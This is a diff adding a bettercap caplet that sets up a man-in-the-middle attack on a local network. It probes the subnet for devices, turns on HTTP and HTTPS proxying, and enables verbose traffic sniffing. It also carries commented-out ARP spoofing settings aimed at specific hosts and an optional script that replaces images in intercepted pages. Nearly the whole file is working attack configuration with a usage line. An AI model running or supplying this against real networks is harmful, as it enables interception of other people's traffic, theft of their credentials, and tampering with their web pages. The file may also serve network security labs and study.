@@ -1,0 +1,26 @@
+# usage:
+# sudo ./bettercap -caplet https.cap -eval "set arp.spoof.targets 192.168.1.64"
+
+# detect all devices in subnet:
+net.recon on
+net.probe on
+sleep 5
+net.probe off
+net.recon off
+
+# replace all imgages in html-source:
+# set http.proxy.script replace-images.js
+
+# redirect http & https traffic to a proxy:
+http.proxy on
+https.proxy on
+sleep 1
+
+set net.sniff.verbose true
+net.sniff on
+
+# configure arp.spoofing:
+# set arp.spoof.internal true
+# set arp.spoof.fullduplex true
+# set arp.spoof.targets 172.16.0.1, 172.16.0.15
+# arp.spoof on
